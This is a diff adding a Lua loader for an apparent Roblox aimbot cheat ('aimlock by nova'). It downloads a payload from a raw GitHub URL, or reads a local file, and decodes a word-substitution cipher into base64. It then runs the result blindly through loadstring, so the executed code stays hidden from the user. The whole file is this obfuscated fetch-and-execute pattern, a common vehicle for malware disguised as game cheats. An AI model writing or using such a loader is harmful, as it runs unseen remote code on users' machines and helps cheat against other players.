@@ -1,0 +1,111 @@
+
+local HttpService = game:GetService("HttpService")
+
+local REMOTE_URL = "https://raw.githubusercontent.com/gadper91-gif/4mo/refs/heads/main/kuerwwq"
+local LOCAL_FILE = "aimlock_by_nova_encrypted.txt"
+
+local charToWord = {
+    ["A"] = "amber",
+    ["B"] = "birch",
+    ["C"] = "cinder",
+    ["D"] = "dusk",
+    ["E"] = "ember",
+    ["F"] = "flint",
+    ["G"] = "glimmer",
+    ["H"] = "harbor",
+    ["I"] = "ivory",
+    ["J"] = "jade",
+    ["K"] = "kestrel",
+    ["L"] = "lunar",
+    ["M"] = "mist",
+    ["N"] = "nova",
+    ["O"] = "onyx",
+    ["P"] = "prairie",
+    ["Q"] = "quartz",
+    ["R"] = "rust",
+    ["S"] = "sage",
+    ["T"] = "terra",
+    ["U"] = "umber",
+    ["V"] = "verge",
+    ["W"] = "willow",
+    ["X"] = "xenon",
+    ["Y"] = "yarrow",
+    ["Z"] = "zephyr",
+    ["a"] = "aspen",
+    ["b"] = "bramble",
+    ["c"] = "carmine",
+    ["d"] = "drift",
+    ["e"] = "elder",
+    ["f"] = "fable",
+    ["g"] = "gauze",
+    ["h"] = "haven",
+    ["i"] = "iris",
+    ["j"] = "juniper",
+    ["k"] = "kiln",
+    ["l"] = "locket",
+    ["m"] = "marigold",
+    ["n"] = "nimbus",
+    ["o"] = "ochre",
+    ["p"] = "pebble",
+    ["q"] = "quill",
+    ["r"] = "ripple",
+    ["s"] = "silken",
+    ["t"] = "thicket",
+    ["u"] = "umbra",
+    ["v"] = "velvet",
+    ["w"] = "wisp",
+    ["x"] = "xylem",
+    ["y"] = "yawl",
+    ["z"] = "zinnia",
+    ["0"] = "lantern",
+    ["1"] = "mosaic",
+    ["2"] = "nickel",
+    ["3"] = "opal",
+    ["4"] = "petal",
+    ["5"] = "quartzite",
+    ["6"] = "rivet",
+    ["7"] = "solder",
+    ["8"] = "talon",
+    ["9"] = "umami",
+    ["+"] = "valence",
+    ["/"] = "warden",
+    ["="] = "zenith",
+}
+
+local wordToChar = {}
+for ch, word in pairs(charToWord) do
+    wordToChar[word] = ch
+end
+
+local function decodeWords(wordText)
+    local chars = {}
+    for word in string.gmatch(wordText, "%S+") do
+        local ch = wordToChar[word]
+        if ch then
+            table.insert(chars, ch)
+        end
+    end
+    return table.concat(chars)
+end
+
+local function fetchPayload()
+    if REMOTE_URL ~= "" then
+        local ok, res = pcall(function()
+            return game:HttpGet(REMOTE_URL)
+        end)
+        if ok and res and res ~= "" then
+            return res
+        end
+    end
+
+    if isfile and isfile(LOCAL_FILE) then
+        return readfile(LOCAL_FILE)
+    end
+
+    error("Aimlock loader: no payload found. Set REMOTE_URL or place " .. LOCAL_FILE .. " next to the loader.")
+end
+
+local payload = fetchPayload()
+local base64 = decodeWords(payload)
+local source = HttpService:Base64Decode(base64)
+return loadstring(source)()
